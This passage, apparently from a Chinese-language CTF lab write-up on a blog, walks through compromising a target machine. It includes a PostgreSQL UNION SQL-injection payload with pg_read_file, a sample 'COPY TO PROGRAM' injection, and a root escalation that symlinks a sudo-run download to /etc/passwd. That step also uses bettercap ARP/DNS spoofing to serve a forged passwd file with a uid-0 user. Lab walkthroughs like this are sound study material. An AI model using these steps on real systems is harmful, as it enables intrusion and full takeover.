    Payload: keyword=1<span class="pl-s"><span class="pl-pds">'</span> UNION ALL SELECT NULL,(CHR(113)||CHR(120)||CHR(107)||CHR(106)||CHR(113))||(CHR(112)||CHR(80)||CHR(88)||CHR(70)||CHR(67)||CHR(88)||CHR(101)||CHR(120)||CHR(77)||CHR(112)||CHR(109)||CHR(71)||CHR(76)||CHR(87)||CHR(106)||CHR(104)||CHR(107)||CHR(114)||CHR(107)||CHR(85)||CHR(83)||CHR(101)||CHR(82)||CHR(66)||CHR(100)||CHR(99)||CHR(83)||CHR(85)||CHR(80)||CHR(115)||CHR(107)||CHR(100)||CHR(116)||CHR(102)||CHR(101)||CHR(114)||CHR(74)||CHR(110)||CHR(101)||CHR(102))||(CHR(113)||CHR(112)||CHR(113)||CHR(112)||CHR(113)),NULL-- gGka</span>
<span class="pl-s">---</span>
<span class="pl-s">[00:14:51] [INFO] the back-end DBMS is PostgreSQL</span>
<span class="pl-s">back-end DBMS: PostgreSQL</span>
<span class="pl-s">[00:14:51] [INFO] fetching SQL SELECT statement query output: <span class="pl-pds">'</span></span>SELECT pg_read_file(<span class="pl-s"><span class="pl-pds">'</span>/opt/app.py<span class="pl-pds">'</span></span>, 0, 1000000)<span class="pl-s"><span class="pl-pds">'</span></span>
<span class="pl-s">[00:14:51] [WARNING] reflective value(s) found and filtering out</span>
<span class="pl-s">SELECT pg_read_file('/opt/app.py', 0, 1000000): 'from flask import Flask, request, render_template_string, redirect, session\nimport psycopg2\n\napp = Flask(__name__)\napp.secret_key = "s3cret_key"\n\n# Database connection\nconn = psycopg2.connect(\n    dbname="dvtest",\n    user="dvuser",\n    password="dvpass",\n    host="localhost",\n    port="5432"\n)\n\n# HTML template with search form\nTEMPLATE = """\n&lt;!doctype html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Admin Panel&lt;/title&gt;\n    &lt;style&gt;\n        body { font-family: Arial, sans-serif; margin: 20px; }\n        table { border-collapse: collapse; width: 100%; }\n        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }\n        th { background-color: #f2f2f2; }\n        .error { color: red; }\n    &lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;h2&gt;Welcome{% if user %}, {{ user }}{% endif %}&lt;/h2&gt;\n    {% if not user %}\n        &lt;form method="POST" action="/"&gt;\n            Username: &lt;input name="username" required&gt;\n            &lt;input type="submit" value="Login"&gt;\n        &lt;/form&gt;\n    {% else %}\n        &lt;p&gt;&lt;a href="/search"&gt;User Search&lt;/a&gt; | &lt;a href="/logout"&gt;Logout&lt;/a&gt;&lt;/p&gt;\n        &lt;form method="POST" action="/search"&gt;\n            Search User: &lt;input name="keyword" placeholder="Enter username" value="{{ keyword|default('') }}"&gt;\n            &lt;input type="submit" value="Search"&gt;\n        &lt;/form&gt;\n    {% endif %}\n    {% if results %}\n        &lt;h3&gt;Search Results&lt;/h3&gt;\n        &lt;table&gt;\n            &lt;tr&gt;&lt;th&gt;ID&lt;/th&gt;&lt;th&gt;Username&lt;/th&gt;&lt;th&gt;Email&lt;/th&gt;&lt;/tr&gt;\n            {% for row in results %}\n                &lt;tr&gt;&lt;td&gt;{{ row[0] }}&lt;/td&gt;&lt;td&gt;{{ row[1] }}&lt;/td&gt;&lt;td&gt;{{ row[2] }}&lt;/td&gt;&lt;/tr&gt;\n            {% endfor %}\n        &lt;/table&gt;\n    {% endif %}\n    {% if message %}\n        &lt;p class="error"&gt;{{ message }}&lt;/p&gt;\n    {% endif %}\n&lt;/body&gt;\n&lt;/html&gt;\n"""\n\n@app.route("/", methods=["GET", "POST"])\ndef login():\n    if request.method == "POST":\n        username = request.form.get("username")\n        if username:\n            session["user"] = username\n            return redirect("/search")\n        return render_template_string(TEMPLATE, user=None, message="Username cannot be empty")\n    return render_template_string(TEMPLATE, user=None)\n\n@app.route("/logout")\ndef logout():\n    session.pop("user", None)\n    return redirect("/")\n\n@app.route("/search", methods=["GET", "POST"])\ndef search():\n    if "user" not in session:\n        return redirect("/")\n    \n    results = []\n    message = None\n    keyword = ""\n    \n    if request.method == "POST":\n        keyword = request.form.get("keyword", "")\n        try:\n            cur = conn.cursor()\n            # Vulnerable SQL query: allows injection of commands like COPY TO PROGRAM\n            # Example exploit: ' OR 1=1; COPY users TO PROGRAM 'whoami'; --\n            sql = f"SELECT id, username, email FROM users WHERE username LIKE '%{keyword}%'"\n            cur.execute(sql)\n            results = cur.fetchall()\n            conn.commit()\n        except Exception as e:\n            conn.rollback()\n            message = f"Query failed: {str(e)}"\n    \n    return render_template_string(TEMPLATE, user=session["user"], results=results, message=message, keyword=keyword)\n\nif __name__ == "__main__":\n    app.run(host="0.0.0.0", port=28080)\n'</span>
<span class="pl-s">[00:14:51] [INFO] fetched data logged to text files under <span class="pl-pds">'</span></span>/home/kali/.local/share/sqlmap/output/192.168.205.203<span class="pl-s"><span class="pl-pds">'</span></span>
<span class="pl-s"></span>
<span class="pl-s">[*] ending @ 00:14:51 /2025-07-22/</span></pre></div>
<p>后面扒拉了一会，惊奇的发现前面白干了，telnet是个后门</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ telnet 192.168.205.205
Trying 192.168.205.205...
Connected to 192.168.205.205.
Escape character is <span class="pl-s"><span class="pl-pds">'</span>^]<span class="pl-pds">'</span></span>.
Username: 
xiao  
Password: 
login successful
Linux Multi 4.19.0-27-amd64 <span class="pl-c"><span class="pl-c">#</span>1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span>
Your session is being monitored per security policy
xiao@Multi:<span class="pl-k">~</span>$ id
uid=1001(xiao) gid=1001(xiao) groups=1001(xiao)</pre></div>
<h1>三、权限提升</h1>
<h2>to todd</h2>
<div class="highlight highlight-source-shell"><pre class="notranslate">xiao@Multi:<span class="pl-k">~</span>$ sudo -l
Sudo access restricted by policy (CODE:0x7E3) -l
xiao@Multi:<span class="pl-k">~</span>$ ls -al
total 24
drwx------ 2 xiao xiao 4096 Jul 18 22:46 <span class="pl-c1">.</span>
drwxr-xr-x 5 root root 4096 Jul 17 09:04 ..
lrwxrwxrwx 1 root root    9 Jul 18 11:13 .bash_history -<span class="pl-k">&gt;</span> /dev/null
-rw-r--r-- 1 xiao xiao  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 xiao xiao 3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 xiao xiao  807 Apr 18  2019 .profile
-rw------- 1 xiao xiao   44 Jul 17 07:31 user.txt
xiao@Multi:<span class="pl-k">~</span>$ cat user.txt 
flag{user-33b02bc15ce9557d2dd8484d58f95ac4}
xiao@Multi:<span class="pl-k">~</span>$ which sudo
/usr/bin/sudo
xiao@Multi:<span class="pl-k">~</span>$ /usr/bin/sudo -l

We trust you have received the usual lecture from the <span class="pl-k">local</span> System
Administrator. It usually boils down to these three things:

    <span class="pl-c"><span class="pl-c">#</span>1) Respect the privacy of others.</span>
    <span class="pl-c"><span class="pl-c">#</span>2) Think before you type.</span>
    <span class="pl-c"><span class="pl-c">#</span>3) With great power comes great responsibility.</span>

For security reasons, the password you <span class="pl-c1">type</span> will not be visible.

[sudo] password <span class="pl-k">for</span> xiao: 
sudo: a password is required</pre></div>
<p>sudo被限制了，看看其他的</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">xiao@Multi:<span class="pl-k">~</span>$ find / -perm -4000 -type f <span class="pl-k">2&gt;</span>/dev/null
/usr/sbin/mount.nfs
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/telnetlogin
/usr/libexec/polkit-agent-helper-1
xiao@Multi:<span class="pl-k">~</span>$ getcap -r / <span class="pl-k">2&gt;</span>/dev/null
xiao@Multi:<span class="pl-k">~</span>$ ls -al /opt/
total 12
drwxr-xr-x  2 root root 4096 Jul 18 11:21 <span class="pl-c1">.</span>
drwxr-xr-x 18 root root 4096 Mar 18 20:37 ..
-rw-r--r--  1 root root 3136 Jul 18 11:21 app.py
xiao@Multi:<span class="pl-k">~</span>$ find / -user xiao <span class="pl-k">!</span> -path <span class="pl-s"><span class="pl-pds">'</span>/proc/*<span class="pl-pds">'</span></span> <span class="pl-k">!</span> -path <span class="pl-s"><span class="pl-pds">'</span>/sys/*<span class="pl-pds">'</span></span> <span class="pl-k">!</span> -path <span class="pl-s"><span class="pl-pds">'</span>/run/*<span class="pl-pds">'</span></span> <span class="pl-k">2&gt;</span>/dev/null
/dev/pts/0
/home/xiao
/home/xiao/.bash_logout
/home/xiao/.bashrc
/home/xiao/user.txt
/home/xiao/.profile
/var/www/html/pub</pre></div>
<p><code class="notranslate">/var/www/html/pub</code>这个目录之前爆破到了，但是什么东西都没有，我们去看看</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">xiao@Multi:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span> /var/www/html/pub
xiao@Multi:/var/www/html/pub$ ls -al
total 16
drwxr-xr-x 2 xiao     www-data 4096 Jul 18 22:43 <span class="pl-c1">.</span>
drwxr-xr-x 3 root     root     4096 Jul 17 09:05 ..
-rw-r--r-- 1 root     root      230 Jul 18 11:38 index.html
-rw------- 1 www-data www-data   19 Jul 17 09:06 xiao@Multi:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span> /var/www/html/pub
xiao@Multi:/var/www/html/pub$ ls -al
total 16
drwxr-xr-x 2 xiao     www-data 4096 Jul 18 22:43 <span class="pl-c1">.</span>
drwxr-xr-x 3 root     root     4096 Jul 17 09:05 ..
-rw-r--r-- 1 root     root      230 Jul 18 11:38 index.html
-rw------- 1 www-data www-data   19 Jul 17 09:06 .passowrd_creds</pre></div>
<p>有一个<code class="notranslate">.passowrd_creds</code>，去web读一下</p>
<p>拿到了一个密码<code class="notranslate">koUF5q)*RN&amp;m0PTB&amp;D</code>，经过测试是todd的密码</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">xiao@Multi:/var/www/html/pub$ su todd
Use of su is prohibited (CODE:0x9F2) todd
xiao@Multi:/var/www/html/pub$ which su
/usr/bin/su
xiao@Multi:/var/www/html/pub$ /usr/bin/su todd
Password: 
todd@Multi:/var/www/html/pub$ id
uid=1000(todd) gid=1000(todd) groups=1000(todd)</pre></div>
<h2>to root</h2>
<div class="highlight highlight-source-shell"><pre class="notranslate">todd@Multi:/var/www/html/pub$ sudo -l
Matching Defaults entries <span class="pl-k">for</span> todd on Multi:
    secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin, env_keep+=<span class="pl-s"><span class="pl-pds">"</span>LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET<span class="pl-pds">"</span></span>, env_keep+=<span class="pl-s"><span class="pl-pds">"</span>XAPPLRESDIR XFILESEARCHPATH</span>
<span class="pl-s">    XUSERFILESEARCHPATH<span class="pl-pds">"</span></span>, mail_badpass

Runas and Command-specific defaults <span class="pl-k">for</span> todd:
    Defaults<span class="pl-k">!</span>/usr/sbin/visudo env_keep+=<span class="pl-s"><span class="pl-pds">"</span>SUDO_EDITOR EDITOR VISUAL<span class="pl-pds">"</span></span>

User todd may run the following commands on Multi:
    (ALL <span class="pl-c1">:</span> ALL) NOPASSWD: /usr/bin/cupp</pre></div>
<p>这里应该就是这个靶机有意思的点了，cupp是一个字典生成器</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">todd@Multi:/var/www/html/pub$ sudo /usr/bin/cupp -h
usage: cupp [-h] [-i <span class="pl-k">|</span> <span class="pl-k">-w</span> FILENAME <span class="pl-k">|</span> -l <span class="pl-k">|</span> <span class="pl-k">-a</span> <span class="pl-k">|</span> -v] [-q]

Common User Passwords Profiler

optional arguments:
  -h, --help         show this <span class="pl-c1">help</span> message and <span class="pl-c1">exit</span>
  -i, --interactive  Interactive questions <span class="pl-k">for</span> user password profiling
  -w FILENAME        Use this option to improve existing dictionary, or WyD.pl output to make some pwnsauce
  -l                 Download huge wordlists from repository
  -a                 Parse default usernames and passwords directly from Alecto DB. Project Alecto uses purified databases of Phenoelit and CIRT which were merged and enhanced
  -v, --version      Show the version of this program.
  -q, --quiet        Quiet mode (don<span class="pl-s"><span class="pl-pds">'</span>t print banner)</span></pre></div>
<p>经过测试，你应该会发现<code class="notranslate">-i</code> ,<code class="notranslate">-w</code> 生成的字典会固定<code class="notranslate">.txt</code>的后缀，所以我们很难利用</p>
<p>比较可能性的是<code class="notranslate">-l</code></p>
<p>具体操作</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">todd@Multi:/var/www/html/pub$ <span class="pl-c1">cd</span> 
todd@Multi:<span class="pl-k">~</span>$ sudo /usr/bin/cupp -l
 ___________ 
   cupp.py<span class="pl-k">!</span>                 <span class="pl-c"><span class="pl-c">#</span> Common</span>
      <span class="pl-cce">\ </span>                    <span class="pl-c"><span class="pl-c">#</span> User</span>
       <span class="pl-cce">\ </span>  ,__,             <span class="pl-c"><span class="pl-c">#</span> Passwords</span>
        <span class="pl-cce">\ </span> (oo)____         <span class="pl-c"><span class="pl-c">#</span> Profiler</span>
           (__)    )<span class="pl-cce">\ </span>  
              <span class="pl-k">||</span>--<span class="pl-k">||</span> <span class="pl-k">*</span>      [ Muris Kurgas <span class="pl-k">|</span> j0rgan@remote-exploit.org ]
                            [ Mebus <span class="pl-k">|</span> https://github.com/Mebus/]


        Choose the section you want to download:

     1   Moby            14      french          27      places
     2   afrikaans       15      german          28      polish
     3   american        16      hindi           29      random
     4   aussie          17      hungarian       30      religion
     5   chinese         18      italian         31      russian
     6   computer        19      japanese        32      science
     7   croatian        20      latin           33      spanish
     8   czech           21      literature      34      swahili
     9   danish          22      movieTV         35      swedish
    10   databases       23      music           36      turkish
    11   dictionaries    24      names           37      yiddish
    12   dutch           25      net             38      <span class="pl-c1">exit</span> program
    13   finnish         26      norwegian       


        Files will be downloaded from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/ repository

        Tip: After downloading wordlist, you can improve it with -w option

<span class="pl-k">&gt;</span> Enter number: 1
[+] Downloading dictionaries/Moby/mhyph.tar.gz from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/Moby/mhyph.tar.gz ... 
^CTraceback (most recent call last):
  File <span class="pl-s"><span class="pl-pds">"</span>/usr/bin/cupp<span class="pl-pds">"</span></span>, line 1078, <span class="pl-k">in</span> <span class="pl-k">&lt;</span>module<span class="pl-k">&gt;</span>
    <span class="pl-en">main</span>()
  File <span class="pl-s"><span class="pl-pds">"</span>/usr/bin/cupp<span class="pl-pds">"</span></span>, line 1024, <span class="pl-k">in</span> main
    <span class="pl-en">download_wordlist</span>()
  File <span class="pl-s"><span class="pl-pds">"</span>/usr/bin/cupp<span class="pl-pds">"</span></span>, line 782, <span class="pl-k">in</span> download_wordlist
    download_wordlist_http(filedown)
  File <span class="pl-s"><span class="pl-pds">"</span>/usr/bin/cupp<span class="pl-pds">"</span></span>, line 993, <span class="pl-k">in</span> download_wordlist_http
    download_http(url, tgt)
  File <span class="pl-s"><span class="pl-pds">"</span>/usr/bin/cupp<span class="pl-pds">"</span></span>, line 698, <span class="pl-k">in</span> download_http
    <span class="pl-en">localFile.write(webFile.read</span>())
  File <span class="pl-s"><span class="pl-pds">"</span>/usr/lib/python3.9/http/client.py<span class="pl-pds">"</span></span>, line 471, <span class="pl-k">in</span> <span class="pl-c1">read</span>
    s = self._safe_read(self.length)
  File <span class="pl-s"><span class="pl-pds">"</span>/usr/lib/python3.9/http/client.py<span class="pl-pds">"</span></span>, line 612, <span class="pl-k">in</span> _safe_read
    data = self.fp.read(amt)
  File <span class="pl-s"><span class="pl-pds">"</span>/usr/lib/python3.9/socket.py<span class="pl-pds">"</span></span>, line 704, <span class="pl-k">in</span> readinto
    <span class="pl-k">return</span> self._sock.recv_into(b)
KeyboardInterrupt</pre></div>
<p>可以看到执行 sudo /usr/bin/cupp -l 后，脚本会从一个固定的 URL (<a href="http://ftp.funet.fi/" rel="nofollow">http://ftp.funet.fi/</a>...) 下载文件。下载的文件会保存在<strong>当前工作目录</strong>下，并创建一个 <code class="notranslate">dictionaries/</code> 子目录结构。例如，选择 1 Moby，它会尝试创建并写入文件到 <code class="notranslate">./dictionaries/Moby/mhyph.tar.gz</code>。因为命令是以 sudo 执行的，所以文件写入操作拥有 root 权限。</p>
<p>这里就有一个问题，他没有检查目标路径是否为一个符号链接，所以我们想覆盖什么就覆盖什么</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">todd@Multi:<span class="pl-k">~</span>$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
xiao:x:1001:1001::/home/xiao:/bin/bash
telnetd:x:106:113::/nonexistent:/usr/sbin/nologin
redis:x:107:114::/var/lib/redis:/usr/sbin/nologin
ftp:x:108:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
secure_user:x:1002:1002::/home/secure_user:/bin/bash
mysql:x:109:116:MySQL Server,,,:/nonexistent:/bin/false
samba_user:x:1003:1003::/home/samba_user:/bin/false
_rpc:x:110:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:111:65534::/var/lib/nfs:/usr/sbin/nologin
postgres:x:112:119:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
todd:x:1000:1000:,,,:/home/todd:/bin/bash

todd@Multi:<span class="pl-k">~</span>$ find dictionaries/
dictionaries/
dictionaries/Moby
dictionaries/Moby/mhyph.tar.gz</pre></div>
<p>先将现在的dictionaries重命名为1（在我们的家目录下，我们有绝对的权限），并伪造一个恶意的dictionaries</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">todd@Multi:<span class="pl-k">~</span>$ mv dictionaries/ 1
todd@Multi:<span class="pl-k">~</span>$ mkdir -p dictionaries/Moby
todd@Multi:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span> dictionaries/Moby/
todd@Multi:<span class="pl-k">~</span>/dictionaries/Moby$ ln -s /etc/passwd mhyph.tar.gz</pre></div>
<p>切换到kail，按照他的passwd在最后一行给自己加一个特权用户，然后重命名，开一个web服务</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ <span class="pl-c1">cd</span> tmp 
                          
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ mkdir -p ./pub/unix/security/passwd/crack/dictionaries/Moby/
                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ mkdir -p ./pub/unix/security/passwd/crack/dictionaries/Moby/
                               
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ vim ./pub/unix/security/passwd/crack/dictionaries/Moby/pass        
                       
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ tail -n 1 ./pub/unix/security/passwd/crack/dictionaries/Moby/pass
b:<span class="pl-smi">$1</span><span class="pl-smi">$AydoDDh4$tEky6m30</span>.0nY3HZ8FgoGI0:0:0::/root:/bin/bash

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ mv ./pub/unix/security/passwd/crack/dictionaries/Moby/pass ./pub/unix/security/passwd/crack/dictionaries/Moby/mhyph.tar.gz

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</pre></div>
<p>启动 DNS 欺骗</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">sudo bettercap
<span class="pl-k">&gt;&gt;</span> <span class="pl-c1">set</span> arp.spoof.targets 192.168.205.205
<span class="pl-k">&gt;&gt;</span> <span class="pl-c1">set</span> dns.spoof.domains ftp.funet.fi
<span class="pl-k">&gt;&gt;</span> <span class="pl-c1">set</span> dns.spoof.address 192.168.205.128
<span class="pl-k">&gt;&gt;</span> arp.spoof on
<span class="pl-k">&gt;&gt;</span> dns.spoof on</pre></div>
<p>触发漏洞</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">todd@Multi:<span class="pl-k">~</span>/dictionaries/Moby$ <span class="pl-c1">cd</span> 
todd@Multi:<span class="pl-k">~</span>$ sudo /usr/bin/cupp -l
 ___________ 
   cupp.py<span class="pl-k">!</span>                 <span class="pl-c"><span class="pl-c">#</span> Common</span>
      <span class="pl-cce">\ </span>                    <span class="pl-c"><span class="pl-c">#</span> User</span>
       <span class="pl-cce">\ </span>  ,__,             <span class="pl-c"><span class="pl-c">#</span> Passwords</span>
        <span class="pl-cce">\ </span> (oo)____         <span class="pl-c"><span class="pl-c">#</span> Profiler</span>
           (__)    )<span class="pl-cce">\ </span>  
              <span class="pl-k">||</span>--<span class="pl-k">||</span> <span class="pl-k">*</span>      [ Muris Kurgas <span class="pl-k">|</span> j0rgan@remote-exploit.org ]
                            [ Mebus <span class="pl-k">|</span> https://github.com/Mebus/]


        Choose the section you want to download:

     1   Moby            14      french          27      places
     2   afrikaans       15      german          28      polish
     3   american        16      hindi           29      random
     4   aussie          17      hungarian       30      religion
     5   chinese         18      italian         31      russian
     6   computer        19      japanese        32      science
     7   croatian        20      latin           33      spanish
     8   czech           21      literature      34      swahili
     9   danish          22      movieTV         35      swedish
    10   databases       23      music           36      turkish
    11   dictionaries    24      names           37      yiddish
    12   dutch           25      net             38      <span class="pl-c1">exit</span> program
    13   finnish         26      norwegian       


        Files will be downloaded from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/ repository

        Tip: After downloading wordlist, you can improve it with -w option

<span class="pl-k">&gt;</span> Enter number: 1
[+] Downloading dictionaries/Moby/mhyph.tar.gz from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/Moby/mhyph.tar.gz ... 
[+] Downloading dictionaries/Moby/mlang.tar.gz from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/Moby/mlang.tar.gz ... 
Traceback (most recent call last):
  File <span class="pl-s"><span class="pl-pds">"</span>/usr/bin/cupp<span class="pl-pds">"</span></span>, line 1078, <span class="pl-k">in</span> <span class="pl-k">&lt;</span>module<span class="pl-k">&gt;</span>
    <span class="pl-en">main</span>()
  File <span class="pl-s"><span class="pl-pds">"</span>/usr/bin/cupp<span class="pl-pds">"</span></span>, line 1024, <span class="pl-k">in</span> main
    <span class="pl-en">download_wordlist</span>()
  File <span class="pl-s"><span class="pl-pds">"</span>/usr/bin/cupp<span class="pl-pds">"</span></span>, line 782, <span class="pl-k">in</span> download_wordlist
    download_wordlist_http(filedown)
  File <span class="pl-s"><span class="pl-pds">"</span>/usr/bin/cupp<span class="pl-pds">"</span></span>, line 993, <span class="pl-k">in</span> download_wordlist_http
    download_http(url, tgt)
  File <span class="pl-s"><span class="pl-pds">"</span>/usr/bin/cupp<span class="pl-pds">"</span></span>, line 696, <span class="pl-k">in</span> download_http
    webFile = urllib.request.urlopen(url)
  File <span class="pl-s"><span class="pl-pds">"</span>/usr/lib/python3.9/urllib/request.py<span class="pl-pds">"</span></span>, line 214, <span class="pl-k">in</span> urlopen
    <span class="pl-k">return</span> opener.open(url, data, timeout)
  File <span class="pl-s"><span class="pl-pds">"</span>/usr/lib/python3.9/urllib/request.py<span class="pl-pds">"</span></span>, line 523, <span class="pl-k">in</span> open
    response = meth(req, response)
  File <span class="pl-s"><span class="pl-pds">"</span>/usr/lib/python3.9/urllib/request.py<span class="pl-pds">"</span></span>, line 632, <span class="pl-k">in</span> http_response
    response = self.parent.error(
  File <span class="pl-s"><span class="pl-pds">"</span>/usr/lib/python3.9/urllib/request.py<span class="pl-pds">"</span></span>, line 561, <span class="pl-k">in</span> error
    <span class="pl-k">return</span> self._call_chain(<span class="pl-k">*</span>args)
  File <span class="pl-s"><span class="pl-pds">"</span>/usr/lib/python3.9/urllib/request.py<span class="pl-pds">"</span></span>, line 494, <span class="pl-k">in</span> _call_chain
    result = func(<span class="pl-k">*</span>args)
  File <span class="pl-s"><span class="pl-pds">"</span>/usr/lib/python3.9/urllib/request.py<span class="pl-pds">"</span></span>, line 641, <span class="pl-k">in</span> http_error_default
    raise HTTPError(req.full_url, code, msg, hdrs, fp)
urllib.error.HTTPError: HTTP Error 404: File not found</pre></div>
<p>报错了，并且bettercap和pyton web都有提示就是成功了</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">todd@Multi:<span class="pl-k">~</span>$ su b
Password: 
root@Multi:/home/todd# id
uid=0(root) gid=0(root) groups=0(root)
root@Multi:/home/todd# cat /root/root.txt /home/xiao/user.txt 
flag{root-922c8837565de5bd2e342c65a2e67ef9}
flag{user-33b02bc15ce9557d2dd8484d58f95ac4}</pre></div></div>
<div style="font-size:small;margin-top:8px;float:right;"></div>

<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
<div class="comments" id="comments"></div>

</div>
    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
<div id="footer2">
    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
</div>

<script>
var now=new Date();
document.getElementById("copyrightYear").innerHTML=now.getFullYear();

if(""!=""){
    var startSite=new Date("");
    var diff=now.getTime()-startSite.getTime();
    var diffDay=Math.floor(diff/(1000*60*60*24));
    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
}
</script></div>
</body>
<script>
var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 